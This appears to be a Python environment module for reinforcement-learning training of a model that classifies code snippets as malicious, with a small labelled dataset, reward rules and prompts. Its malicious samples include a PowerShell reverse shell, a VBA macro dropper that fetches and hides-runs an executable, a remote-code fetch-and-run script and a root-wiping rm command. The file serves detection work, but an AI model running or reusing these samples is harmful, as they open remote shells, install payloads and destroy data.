"""Environment helpers for malicious code classification RL task using OpenPipe ART.

This module defines:
1. Public constants `RANDOM_SEED` and `TRAINING_CONFIG` consumed by OpenPipe's
   generic `training.py` driver.
2. Lightweight utilities for sampling labelled code snippets and validating
   the agent's JSON formatted answers.

The task:
----------
For each episode the agent is given a *single* code snippet together with the
language and an (optional) filename. The agent must reply **exactly** with a
compact JSON object with two keys:

```json
{"is_malicious": <bool>, "explanation": "short string"}
```

Rewards:
---------
```
 correct classification          +1.0
 wrong classification            -1.0
 invalid / unparsable response    0.0
```

The shaping is deliberately simple yet provides a gradient the policy can
learn from while keeping evaluation deterministic.
"""

from __future__ import annotations

import json
import random
import textwrap
from dataclasses import dataclass
from typing import Any, Tuple

# ---------------------------------------------------------------------------
# Public ART-visible constants
# ---------------------------------------------------------------------------

RANDOM_SEED: int = 17


TRAINING_CONFIG: dict[str, Any] = {
    # Project / model identifiers
    "project": "malicious-code-detection",
    "model_name": "code-detector-001",
    "base_model": "Qwen/Qwen2.5-1.5B",  # small for local training
    # RL training schedule
    "steps": 20,
    "trajectories_per_group": 16,
    "groups_per_step": 1,
    "learning_rate": 1e-5,
    # Generation parameters
    "max_completion_tokens": 64,
    "temperature": 0.2,
    "top_p": 0.95,
    # Runtime safeguards
    "max_exceptions": 16,
    "cleanup_keep_last": 1,
}

random.seed(RANDOM_SEED)

# ---------------------------------------------------------------------------
# Data definitions
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class CodeSnippet:
    """Container holding a labelled code example."""

    id: str
    language: str
    filename: str
    code: str
    is_malicious: bool


# NOTE: keep the dataset small – enough variance but lightweight.
_SEED_SNIPPETS: list[CodeSnippet] = [
    # Benign ----------------------------------------------------------------
    CodeSnippet(
        id="benign_py_hello",
        language="python",
        filename="hello.py",
        code=textwrap.dedent(
            """
            def greet(name: str) -> None:
                print(f"Hello, {name}!")


            if __name__ == "__main__":
                greet("World")
            """
        ),
        is_malicious=False,
    ),
    CodeSnippet(
        id="benign_c_sort",
        language="c",
        filename="sort.c",
        code=textwrap.dedent(
            """
            #include <stdio.h>

            void bubble(int *arr, int n){
              for(int i=0;i<n-1;i++)
                for(int j=0;j<n-i-1;j++)
                  if(arr[j]>arr[j+1]){
                    int tmp = arr[j]; arr[j]=arr[j+1]; arr[j+1]=tmp;
                  }
            }
            """
        ),
        is_malicious=False,
    ),
    CodeSnippet(
        id="benign_js_util",
        language="javascript",
        filename="utils.js",
        code="export const add = (a,b) => a+b;",
        is_malicious=False,
    ),
    CodeSnippet(
        id="benign_sh_backup",
        language="bash",
        filename="backup.sh",
        code=textwrap.dedent(
            """
            #!/usr/bin/env bash
            tar -czf backup.tar.gz "$1"
            """
        ),
        is_malicious=False,
    ),
    CodeSnippet(
        id="benign_py_factorial",
        language="python",
        filename="math_utils.py",
        code=textwrap.dedent(
            """
            def factorial(n: int) -> int:
                return 1 if n <= 1 else n * factorial(n-1)
            """
        ),
        is_malicious=False,
    ),
    # Malicious --------------------------------------------------------------
    CodeSnippet(
        id="mal_py_exec_remote",
        language="python",
        filename="evil.py",
        code=textwrap.dedent(
            """
            import urllib.request, subprocess, tempfile, os, sys

            url = sys.argv[1]
            data = urllib.request.urlopen(url).read()
            tmp = tempfile.NamedTemporaryFile(delete=False)
            tmp.write(data)
            tmp.close()
            subprocess.call([sys.executable, tmp.name])
            os.remove(tmp.name)
            """
        ),
        is_malicious=True,
    ),
    CodeSnippet(
        id="mal_ps_reverse_shell",
        language="powershell",
        filename="rev.ps1",
        code=textwrap.dedent(
            """
            $client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);
            $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
                $sendback = (iex $data 2>&1 | Out-String );
                $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush()};
            $client.Close()
            """
        ),
        is_malicious=True,
    ),
    CodeSnippet(
        id="mal_js_eval_b64",
        language="javascript",
        filename="run.js",
        code=textwrap.dedent(
            """
            const payload = 'ZWNobyBoZWxsbyB3b3JsZA==';
            eval(atob(payload));
            """
        ),
        is_malicious=True,
    ),
    CodeSnippet(
        id="mal_vba_dropper",
        language="vba",
        filename="macro.bas",
        code=textwrap.dedent(
            """
            Sub AutoOpen()
            Dim strUrl As String
            strUrl = "http://malicious.domain/payload.exe"
            Dim strSavePath As String
            strSavePath = Environ("TEMP") & "\payload.exe"
            Dim WinHttpReq As Object
            Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
            WinHttpReq.Open "GET", strUrl, False
            WinHttpReq.Send
            If WinHttpReq.Status = 200 Then
                Dim adoStream As Object
                Set adoStream = CreateObject("ADODB.Stream")
                adoStream.Type = 1
                adoStream.Open
                adoStream.Write WinHttpReq.responseBody
                adoStream.SaveToFile strSavePath, 2
                Shell strSavePath, vbHide
            End If
            End Sub
            """
        ),
        is_malicious=True,
    ),
    CodeSnippet(
        id="mal_bash_delete",
        language="bash",
        filename="wipe.sh",
        code="rm -rf --no-preserve-root /",
        is_malicious=True,
    ),
]


# ---------------------------------------------------------------------------
# Public helper functions
# ---------------------------------------------------------------------------


def sample_snippet() -> CodeSnippet:
    """Return a random `CodeSnippet` instance using the global RNG."""

    return random.choice(_SEED_SNIPPETS)


def validate_agent_response(raw_text: str) -> Tuple[float, dict[str, float]]:
    """Validate and score the agent response.

    Parameters
    ----------
    raw_text:
        Assistant reply expected to be JSON with keys `is_malicious` (bool) and
        `explanation` (string).

    Returns
    -------
    reward : float
        1.0 for correct, -1.0 for wrong, 0.0 when invalid / unparsable.
    metrics : dict[str, float]
        Numeric metrics describing result, e.g. {"correct": 1.0}.
    """

    # The actual label is resolved outside this function because we need the
    # snippet for ground truth – the caller is expected to capture it.  This
    # helper only checks JSON integrity; it cannot know correctness.

    try:
        parsed = json.loads(raw_text)
    except json.JSONDecodeError:
        return 0.0, {"invalid_json": 1.0}

    if not isinstance(parsed, dict):
        return 0.0, {"invalid_json": 1.0}

    malicious_flag = parsed.get("is_malicious")
    explanation = parsed.get("explanation")

    if not isinstance(malicious_flag, bool) or not isinstance(explanation, str):
        return 0.0, {"invalid_json": 1.0}

    # Caller will override the reward based on correctness later; here we only
    # signal it is valid.
    return None, {"invalid_json": 0.0}  # type: ignore[return-value]


def compute_reward(is_correct: bool, is_valid: bool) -> float:
    """Map correctness / validity to a scalar reward."""

    if not is_valid:
        return 0.0
    return 1.0 if is_correct else -1.0


# ---------------------------------------------------------------------------
# Prompt helpers
# ---------------------------------------------------------------------------


def build_system_prompt() -> str:
    """Return the static system prompt for every episode."""

    return (
        "You are a security static analysis assistant. "
        "Given a SINGLE code snippet, respond ONLY with a minified JSON object "
        "using keys 'is_malicious' (true/false) and 'explanation' (short sentence). "
        "No additional keys, no markdown, no code fences."
    )


def build_user_prompt(snippet: CodeSnippet) -> str:
    """Format the user prompt embedding the snippet and metadata."""

    header = f"Language: {snippet.language}\nFilename: {snippet.filename}\n".rstrip()
    return f"{header}\n\n{snippet.code.strip()}"

